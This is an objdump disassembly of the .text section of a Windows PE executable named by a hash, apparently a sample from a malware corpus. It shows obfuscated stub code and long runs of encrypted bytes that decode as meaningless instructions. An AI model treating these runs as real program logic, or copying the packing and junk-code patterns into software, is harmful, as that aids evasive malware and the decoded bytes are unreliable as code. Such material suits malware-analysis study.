
c6851577635ff1fedd78c7b127908e635c169cc08cc2868f2b69ba2128d43cb3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43470b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4345e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434653
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4345f3,0x434647
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43470b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43463b,0x10
  40104d:	cmp    DWORD PTR ds:0x43463b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43463b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43463b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43463b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43463b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43463b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43463b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43470f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43465f
  4010b6:	mov    ebx,DWORD PTR ds:0x434733
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434607,0x43468b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43468f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43468f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43468f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43468f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43468f,0xe
  401103:	jne    0x401119
  401109:	push   0x4345eb
  40110e:	push   0x43495b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43468f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43468f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43468f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4345eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0xf9ba1829
  401151:	pmulhw mm7,QWORD PTR [esi+0x7e]
  401155:	jle    0x4011d5
  401157:	mov    ch,0x7f
  401159:	jle    0x4011d9
  40115b:	into   
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	push   cs
  401168:	dec    edi
  401169:	or     al,0xf
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x8050e78c
  401207:	sbb    BYTE PTR [ecx+0x5],dh
  40120a:	mov    edi,0xaee44f37
  40120f:	(bad)  
  401211:	cmc    
  401212:	stos   DWORD PTR es:[edi],eax
  401213:	pop    esi
  401214:	mov    esp,DWORD PTR [edx-0x6d011a4e]
  40121a:	xchg   DWORD PTR [ebx+0x6a],edi
  40121d:	iret   
  40121e:	rcr    DWORD PTR [edx+0x182b16dc],0x55
  401225:	pop    eax
  401226:	in     al,0x1
  401228:	mov    esi,0x70879017
  40122d:	lea    ebp,[ebx-0x2d]
  401230:	iret   
  401231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401232:	sbb    eax,0x8fe0b942
  401237:	addr16 out dx,eax
  401239:	sub    esp,DWORD PTR [esi+0x79e17f07]
  40123f:	fwait
  401240:	clc    
  401241:	jmp    0x72d1095f
  401246:	in     al,dx
  401247:	sub    al,0x1
  401249:	daa    
  40124a:	mov    ch,0x69
  40124c:	bound  eax,QWORD PTR [ebx]
  40124e:	loop   0x4012cc
  401250:	push   ds
  401251:	pop    ebp
  401252:	mov    ds:0xfee6350b,eax
  401257:	adc    cl,BYTE PTR [ecx+0xc6c0089]
  40125d:	shl    DWORD PTR [edi+0x7db1bcf0],cl
  401263:	inc    ebx
  401264:	xchg   DWORD PTR [ebp+0x4b0d1c9e],eax
  40126a:	jne    0x40124d
  40126c:	jp     0x401231
  40126e:	push   ss
  40126f:	push   ebp
  401270:	jge    0x401246
  401272:	xor    BYTE PTR [edx+0x2a],bh
  401275:	aam    0x9d
  401277:	test   BYTE PTR [eax+0x68],al
  40127a:	data16 fcomp DWORD PTR [ecx+0x4a6c2ae4]
  401281:	jae    0x4012d9
  401283:	rol    bh,0xef
  401286:	int3   
  401287:	push   ecx
  401288:	mov    ah,0x4c
  40128a:	dec    ebp
  40128b:	mov    ecx,0xc04c5488
  401290:	adc    ah,BYTE PTR [edx]
  401292:	pop    ebx
  401293:	sti    
  401294:	xchg   ebp,eax
  401295:	xchg   esi,eax
  401296:	shr    BYTE PTR [ebp+0x7d],0xda
  40129a:	and    esp,DWORD PTR [edx-0x67]
  40129d:	mov    ds:0x699c52b8,al
  4012a2:	outs   dx,BYTE PTR ds:[esi]
  4012a3:	push   es
  4012a4:	dec    esi
  4012a5:	sub    ebx,DWORD PTR [edx+0x7c25a44a]
  4012ab:	aam    0xd7
  4012ad:	mov    cl,0x30
  4012af:	push   0xffffff91
  4012b1:	sahf   
  4012b2:	sbb    esi,DWORD PTR [ecx-0x38]
  4012b5:	stos   DWORD PTR es:[edi],eax
  4012b6:	push   ss
  4012b7:	mov    ebx,0x2df474cb
  4012bc:	mov    ds:0xbfbeffd4,al
  4012c1:	inc    eax
  4012c2:	mov    BYTE PTR ss:[esp+eax*2+0x5c],0xec
  4012c8:	out    0x50,al
  4012ca:	hlt    
  4012cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012cc:	mov    ebp,esi
  4012ce:	ret    
  4012cf:	popa   
  4012d0:	int3   
  4012d1:	leave  
  4012d2:	daa    
  4012d3:	call   0x76f1:0x337ccaa9
  4012da:	dec    ebx
  4012db:	clc    
  4012dc:	inc    ebp
  4012dd:	cld    
  4012de:	ds jno 0x40131a
  4012e1:	aas    
  4012e2:	sub    ch,BYTE PTR [eax+ebx*4]
  4012e5:	and    al,0x55
  4012e7:	pop    esp
  4012e8:	mov    ch,0x6a
  4012ea:	gs in  eax,0xad
  4012ed:	pop    edx
  4012ee:	(bad)  
  4012f0:	lods   al,BYTE PTR ds:[esi]
  4012f1:	test   eax,0x5558ac75
  4012f6:	push   edx
  4012f7:	mov    WORD PTR [ecx-0x4b],?
  4012fa:	imul   edx,ebp,0x14
  4012fd:	ss fs data16 js 0x40131f
  401302:	cmp    BYTE PTR [eax+0x3d],ah
  401305:	clc    
  401306:	mov    edi,0xd5b85e53
  40130b:	enter  0xa4be,0x31
  40130f:	fldcw  WORD PTR [esi+ebx*1-0x77]
  401313:	add    DWORD PTR [ecx+0x1222d1],eax
  401319:	add    BYTE PTR [ebp+0x3581fc45],cl
  40131f:	jg     0x401367
  401321:	inc    ebx
  401322:	add    ah,bl
  401324:	push   ebx
  401325:	add    BYTE PTR [eax],al
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43463f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4345ef,0x4345e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4345f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4346c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4346c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4346c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4346c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4346c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4346c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4346c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4346c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43463f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43468b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4345ef,0x43463f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4345eb,0x4346f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434603,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [edx],ebx
  401418:	fsubr  QWORD PTR es:0x7e7e7fb5
  40141f:	mov    ch,0x7f
  401421:	jle    0x4014a1
  401423:	aad    0x3a
  401425:	mov    ch,0xfd
  401427:	mov    esi,0xa047af87
  40142c:	mov    edx,0xab829657
  401431:	aas    
  401432:	or     eax,0xbef47b85
  401437:	inc    esi
  401438:	shr    DWORD PTR [edx+0x31],0x16
  40143c:	int3   
  40143d:	fnsave [esi+ebx*8+0x17]
  401441:	ds stc 
  401443:	dec    edi
  401444:	sahf   
  401445:	iret   
  401446:	sbb    esp,DWORD PTR [edi]
  401448:	in     al,0xd8
  40144a:	mov    ebx,0x3862cd77
  40144f:	pop    edi
  401450:	jb     0x401439
  401452:	cmp    bl,BYTE PTR [ecx]
  401454:	xor    esi,eax
  401456:	mov    cl,ah
  401458:	sub    bl,BYTE PTR [edx]
  40145a:	xchg   ecx,eax
  40145b:	cld    
  40145c:	mov    ds:0x9760ce6b,al
  401461:	push   edx
  401462:	js     0x40141e
  401464:	aas    
  401465:	xchg   DWORD PTR [ecx],ebx
  401467:	dec    esi
  401468:	xchg   edi,eax
  401469:	test   BYTE PTR [esi+0x12370a71],al
  40146f:	xor    al,bh
  401471:	(bad)  
  401472:	jmp    0x401449
  401474:	out    0x50,al
  401476:	xor    al,0xfc
  401478:	mov    ch,0xe2
  40147a:	xchg   ebp,eax
  40147b:	dec    esi
  40147c:	mov    cl,0x8f
  40147e:	and    ebx,eax
  401480:	pop    eax
  401481:	push   es
  401482:	test   dl,0x2d
  401485:	adc    bh,BYTE PTR [ecx-0x2c]
  401488:	mov    esi,0xf93c3e34
  40148d:	int3   
  40148e:	push   ebx
  40148f:	dec    ebp
  401490:	sub    BYTE PTR [edx+0x3d],cl
  401493:	push   edx
  401494:	sar    BYTE PTR [edx],cl
  401496:	fsub   st,st(2)
  401498:	mov    eax,0xa7374a1d
  40149d:	or     BYTE PTR [edx-0x2c],bl
  4014a0:	or     al,0xac
  4014a2:	push   0x26
  4014a4:	sbb    DWORD PTR [esi+0x7b],esi
  4014a7:	shr    DWORD PTR [ecx-0x6e4a8b4b],1
  4014ad:	mov    dl,0xc6
  4014af:	inc    ecx
  4014b0:	xchg   ebp,eax
  4014b1:	dec    esp
  4014b2:	mov    eax,ds:0xad80e99a
  4014b7:	shl    al,cl
  4014b9:	int    0xf0
  4014bb:	(bad)  
  4014bc:	sbb    eax,edi
  4014be:	xor    esi,DWORD PTR [esp+ecx*8-0x64]
  4014c2:	dec    edi
  4014c3:	xchg   esp,eax
  4014c4:	pop    edi
  4014c5:	jno    0x401487
  4014c7:	(bad)  
  4014c8:	push   ecx
  4014c9:	aaa    
  4014ca:	ja     0x40150d
  4014cc:	xor    DWORD PTR [edx+0x4b132ab2],ebp
  4014d2:	or     bl,dl
  4014d4:	iret   
  4014d5:	shl    DWORD PTR [ebx],0x81
  4014d8:	bound  esp,QWORD PTR [ecx]
  4014da:	mov    bl,0x87
  4014dc:	mov    bh,0x95
  4014de:	dec    ebp
  4014df:	nop
  4014e0:	popa   
  4014e1:	std    
  4014e2:	pop    ecx
  4014e3:	sub    al,0xdd
  4014e5:	mov    ds:0xff9fa875,eax
  4014ea:	sbb    al,0xb8
  4014ec:	push   edi
  4014ed:	ficom  WORD PTR [edi]
  4014ef:	xor    DWORD PTR [ebp+0x4],eax
  4014f2:	adc    al,0x2
  4014f4:	icebp  
  4014f5:	out    dx,al
  4014f6:	sbb    al,al
  4014f8:	mov    ds:0xdb404867,eax
  4014fd:	jl     0x401489
  4014ff:	jbe    0x4014a9
  401501:	daa    
  401502:	mov    bh,0x22
  401504:	fimul  WORD PTR [ecx+ebx*4]
  401507:	fst    DWORD PTR gs:[ebx]
  40150a:	xchg   edi,eax
  40150b:	inc    ebp
  40150c:	jmp    0x6cd4:0xfd3441f1
  401513:	sahf   
  401514:	dec    ebx
  401515:	jmp    0x5314f7f8
  40151a:	sbb    DWORD PTR [eax+ebp*1],ecx
  40151d:	cli    
  40151e:	repz mov eax,0x3b245788
  401524:	mov    edi,0x250c4834
  401529:	scas   eax,DWORD PTR es:[edi]
  40152a:	lahf   
  40152b:	ror    eax,0x0
  40152e:	popa   
  40152f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401530:	fsub   DWORD PTR [esi+eax*1]
  401533:	inc    esi
  401534:	retf   0xe003
  401537:	lock jno 0x4015b0
  40153a:	mov    edi,0x443a8df2
  40153f:	loopne 0x4015b6
  401541:	ins    BYTE PTR es:[edi],dx
  401542:	dec    esp
  401543:	mov    DWORD PTR [edi+0x776afe5c],edx
  401549:	fcmovnb st,st(0)
  40154b:	xchg   esi,eax
  40154c:	xor    al,0x83
  40154e:	nop
  40154f:	or     eax,0xf05d0c2f
  401554:	sbb    eax,0xf674a626
  401559:	and    DWORD PTR [esi],ebp
  40155b:	xchg   esp,eax
  40155c:	sub    al,0xa2
  40155e:	ss inc esp
  401560:	and    DWORD PTR [ebx+0x7a],ebp
  401563:	cmp    BYTE PTR [ebp-0x44],0x39
  401567:	(bad)  
  401568:	into   
  401569:	push   eax
  40156a:	mov    bh,0x9f
  40156c:	mov    ebp,0x92b398e7
  401571:	stos   BYTE PTR es:[edi],al
  401572:	not    BYTE PTR ds:0xb1aaaeaf
  401578:	and    DWORD PTR ss:[esi+ebx*2+0x47],edi
  40157d:	ret    
  40157e:	adc    cl,BYTE PTR [edx+ecx*8]
  401581:	mov    bh,0xe3
  401583:	inc    edi
  401584:	add    ebx,eax
  401586:	cld    
  401587:	call   0xe3b8762c
  40158c:	les    eax,FWORD PTR [edi+0x49]
  40158f:	in     eax,dx
  401590:	enter  0x13eb,0xac
  401594:	inc    esp
  401595:	fild   DWORD PTR [ebp+0x27]
  401598:	sub    bh,BYTE PTR [ecx-0x6a]
  40159b:	(bad)  
  40159c:	fstp   TBYTE PTR [eax]
  40159e:	retf   0xd50e
  4015a1:	test   BYTE PTR ds:0xe25fa7ec,ch
  4015a7:	mov    dh,0x48
  4015a9:	leave  
  4015aa:	loopne 0x40160d
  4015ac:	inc    ecx
  4015ad:	jge    0x4015f7
  4015af:	xchg   ebp,eax
  4015b0:	xchg   ebx,eax
  4015b1:	jmp    0x985e:0x392bfbef
  4015b8:	(bad)  
  4015b9:	retf   0xae75
  4015bc:	push   ds
  4015bd:	inc    ebx
  4015be:	sti    
  4015bf:	dec    ebp
  4015c0:	das    
  4015c1:	lahf   
  4015c2:	sbb    DWORD PTR [ecx+0x49],edx
  4015c5:	leave  
  4015c6:	imul   esp,edx,0x68
  4015c9:	lds    esi,FWORD PTR [edi]
  4015cb:	lds    esi,FWORD PTR [ecx+edi*1]
  4015ce:	mov    al,0xee
  4015d0:	fcmovnb st,st(0)
  4015d2:	sbb    edi,DWORD PTR [ebp-0x1c]
  4015d5:	cdq    
  4015d6:	loopne 0x401589
  4015d8:	adc    dh,BYTE PTR [edi]
  4015da:	mov    eax,DWORD PTR [ebp+0x8]
  4015dd:	mov    ecx,DWORD PTR ds:0x43470f
  4015e3:	and    DWORD PTR ds:0x4346bf,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4345e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434643,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434693,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434683,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434683
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434683,ecx
  40162d:	cmp    DWORD PTR ds:0x434683,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434683,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434683
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434683,ecx
  40165f:	cmp    DWORD PTR ds:0x434683,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434623
  401674:	mov    eax,ds:0x43466b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4346cb,0x4346f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4345eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4345ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	out    0x28,eax
  4016bb:	test   al,0xf3
  4016bd:	in     al,dx
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x40170a
  4016c6:	loop   0x401705
  4016c8:	push   0xffffffd9
  4016ca:	mov    ebx,0x584c71b7
  4016cf:	add    eax,0xfe66600d
  4016d4:	xor    dl,BYTE PTR [ecx]
  4016d6:	fsubrp st(3),st
  4016d8:	jne    0x401731
  4016da:	cld    
  4016db:	outs   dx,DWORD PTR ds:[esi]
  4016dc:	fsubrp st(1),st
  4016de:	mov    ds:0x923694f1,eax
  4016e3:	adc    eax,0x4adc581d
  4016e8:	rcl    DWORD PTR [ecx+0x7ad849f3],0xa2
  4016ef:	mov    esi,0x88a984f7
  4016f4:	out    dx,eax
  4016f5:	jb     0x4016be
  4016f7:	iret   
  4016f8:	mov    edi,0x335c474b
  4016fd:	sti    
  4016fe:	pop    ebx
  4016ff:	mov    ebp,0xfe8a5d7a
  401704:	jp     0x401745
  401706:	cmc    
  401707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401708:	add    DWORD PTR [eax-0x7477e3b6],ebx
  40170e:	in     eax,dx
  40170f:	je     0x4016ea
  401711:	xchg   edi,eax
  401712:	or     bl,BYTE PTR [eax]
  401714:	mov    edi,0x4e1d760e
  401719:	stc    
  40171a:	jl     0x4016e2
  40171c:	mov    al,BYTE PTR [ebp-0x70]
  40171f:	jae    0x4016cc
  401721:	jo     0x40174c
  401723:	xchg   ecx,eax
  401724:	popf   
  401725:	int    0xbb
  401727:	leave  
  401728:	lahf   
  401729:	pop    es
  40172a:	and    DWORD PTR [edi-0xd],edi
  40172d:	push   eax
  40172e:	jns    0x4016d7
  401730:	dec    DWORD PTR [ebp+ebx*4+0x445b8c5d]
  401737:	mov    edx,DWORD PTR [ecx-0x4e73b6ed]
  40173d:	gs jge 0x40173a
  401740:	inc    ebp
  401741:	mov    DWORD PTR [ecx+0x18],eax
  401744:	das    
  401745:	(bad)  
  401746:	das    
  401747:	xchg   BYTE PTR [ebp+0x4e3eed4e],ch
  40174d:	and    BYTE PTR [edx],bh
  40174f:	jg     0x4016d9
  401751:	fisttp QWORD PTR [edx]
  401753:	mov    ecx,0xe96b01dc
  401758:	pop    es
  401759:	xchg   edx,eax
  40175a:	mov    cl,0x71
  40175c:	fadd   DWORD PTR [edi+0x3c]
  40175f:	jmp    0x6bf2:0xb8b81682
  401766:	push   esp
  401767:	sub    BYTE PTR [esi+0x2d2ebd05],bh
  40176d:	adc    al,cl
  40176f:	xor    DWORD PTR [ebx-0x7b1afbe],esi
  401775:	mov    bh,0x6b
  401777:	outs   dx,DWORD PTR ds:[esi]
  401778:	dec    edx
  401779:	pop    esi
  40177a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177b:	mov    edx,eax
  40177d:	call   0xa28e:0x9538a700
  401784:	sub    DWORD PTR [edx-0x49c8c0d1],ebx
  40178a:	push   edi
  40178b:	xor    eax,DWORD PTR [esi]
  40178d:	mov    eax,0x8977bae7
  401792:	sbb    DWORD PTR [ebx+esi*4],esp
  401795:	adc    ebx,ebx
  401797:	repnz and BYTE PTR [edx],bl
  40179a:	fcmovbe st,st(5)
  40179c:	jb     0x4017f1
  40179e:	xchg   esp,eax
  40179f:	nop
  4017a0:	cmp    al,0xfb
  4017a2:	es dec ecx
  4017a4:	and    esi,DWORD PTR [edx+0x721fdadf]
  4017aa:	lods   eax,DWORD PTR ds:[esi]
  4017ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ac:	xor    cl,BYTE PTR [esi+eiz*1]
  4017af:	(bad)  
  4017b0:	pusha  
  4017b1:	in     al,0xf2
  4017b3:	loop   0x401776
  4017b5:	test   DWORD PTR [eax-0x5e155729],esi
  4017bb:	push   es
  4017bc:	xchg   edx,eax
  4017bd:	dec    edx
  4017be:	xchg   edi,eax
  4017bf:	push   edx
  4017c0:	int    0xf8
  4017c2:	push   es
  4017c3:	sub    al,0x2a
  4017c5:	sar    DWORD PTR ds:0x815bb093,0x1
  4017cc:	xchg   ecx,eax
  4017cd:	sti    
  4017ce:	add    edi,DWORD PTR [ebx-0x5b914e08]
  4017d4:	mov    ebx,0xead58c5e
  4017d9:	cdq    
  4017da:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4017dc:	sub    BYTE PTR [ecx-0x3b329694],0xc7
  4017e3:	leave  
  4017e4:	mov    esi,0x3cf6c154
  4017e9:	push   edx
  4017ea:	jmp    0x8ea:0xf35ac6e6
  4017f1:	loop   0x401868
  4017f3:	in     al,dx
  4017f4:	jl     0x40181b
  4017f6:	pop    edx
  4017f7:	jnp    0x4017dd
  4017f9:	cmp    DWORD PTR [esi],ebp
  4017fb:	mov    ebp,0x25e6e555
  401800:	cwde   
  401801:	fnstsw WORD PTR [eax-0x66]
  401804:	cmp    al,0x43
  401806:	sbb    eax,0x7977e720
  40180b:	aaa    
  40180c:	lods   eax,DWORD PTR ds:[esi]
  40180d:	xchg   ecx,eax
  40180e:	gs not bl
  401811:	rol    bh,cl
  401813:	test   BYTE PTR [esi+0xb],ah
  401816:	sahf   
  401817:	fcmovnu st,st(4)
  401819:	push   ebp
  40181a:	xor    bh,BYTE PTR [ebx]
  40181c:	lds    eax,FWORD PTR ds:0x8dfd376b
  401822:	mov    WORD PTR [ecx],ss
  401824:	gs repz ja 0x401882
  401828:	sbb    esp,esp
  40182a:	sahf   
  40182b:	out    0xb6,eax
  40182d:	lods   al,BYTE PTR ds:[esi]
  40182e:	test   eax,0xd7ddc918
  401833:	pop    edx
  401834:	pop    es
  401835:	cwde   
  401836:	adc    al,BYTE PTR [esi+0x12]
  401839:	or     al,0xc1
  40183b:	sub    al,0x28
  40183d:	jecxz  0x401822
  40183f:	pop    edi
  401840:	sub    BYTE PTR [esi],dh
  401842:	popf   
  401843:	cmp    BYTE PTR [eax+0x75],0xe0
  401847:	in     eax,0x45
  401849:	sub    al,0x1f
  40184b:	sbb    eax,0xf70aeb74
  401850:	pop    esp
  401851:	jmp    0x401850
  401853:	jae    0x40189e
  401855:	jl     0x40180c
  401857:	push   ss
  401858:	fistp  WORD PTR [ebp*2+0x4fc8ceb4]
  40185f:	mov    eax,ds:0xed1a666c
  401864:	das    
  401865:	iret   
  401866:	cmp    esp,DWORD PTR [edx-0x2be5050b]
  40186c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40186d:	pop    ebx
  40186e:	outs   dx,BYTE PTR ds:[esi]
  40186f:	mov    ah,0x3f
  401871:	and    eax,0xa9ff3b3
  401876:	fisttp DWORD PTR [esi]
  401878:	fdivr  DWORD PTR [eax]
  40187a:	pop    es
  40187b:	jle    0x40188c
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4347030d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x4345e3
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [ebx+0x75],dh
  4018a1:	shl    ch,cl
  4018a3:	sbb    edi,DWORD PTR [ebx+0x7e]
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x4018ae
  4018ac:	xchg   ebx,eax
  4018ad:	push   ds
  4018ae:	dec    ebp
  4018af:	out    dx,al
  4018b0:	push   ebp
  4018b1:	in     eax,0x1f
  4018b3:	inc    eax
  4018b4:	mov    cl,0x49
  4018b6:	inc    edi
  4018b7:	jne    0x40189e
  4018b9:	and    bl,ah
  4018bb:	push   ebx
  4018bc:	push   ss
  4018bd:	pusha  
  4018be:	aad    0xeb
  4018c0:	lock push ss
  4018c2:	sti    
  4018c3:	and    edx,ebp
  4018c5:	dec    edx
  4018c6:	arpl   WORD PTR [edi-0x76],dx
  4018c9:	or     al,0x5e
  4018cb:	ret    0xb34c
  4018ce:	mov    bh,BYTE PTR [ebx+ebp*8+0x13baea1c]
  4018d5:	dec    edi
  4018d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
